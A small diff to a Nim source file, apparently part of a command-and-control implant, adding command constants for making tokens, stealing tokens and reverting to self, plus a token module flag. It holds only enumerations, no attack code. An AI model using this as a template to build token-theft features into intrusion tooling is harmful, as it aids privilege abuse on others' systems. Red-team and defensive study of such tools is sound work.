@@ -52,6 +52,9 @@ type
         CMD_SCREENSHOT = 15'u16
         CMD_DOTNET = 16'u16
         CMD_SLEEPMASK = 17'u16
+        CMD_MAKE_TOKEN = 18'u16
+        CMD_STEAL_TOKEN = 19'u16 
+        CMD_REV2SELF = 20'u16 
 
     StatusType* = enum 
         STATUS_COMPLETED = 0'u8
@@ -99,6 +102,7 @@ type
         MODULE_FILETRANSFER = 32'u32
         MODULE_SCREENSHOT = 64'u32
         MODULE_SITUATIONAL_AWARENESS = 128'u32 
+        MODULE_TOKEN = 256'u32
 
 # Custom iterator for ModuleType, as it uses powers of 2 instead of standard increments
 iterator items*(e: typedesc[ModuleType]): ModuleType =
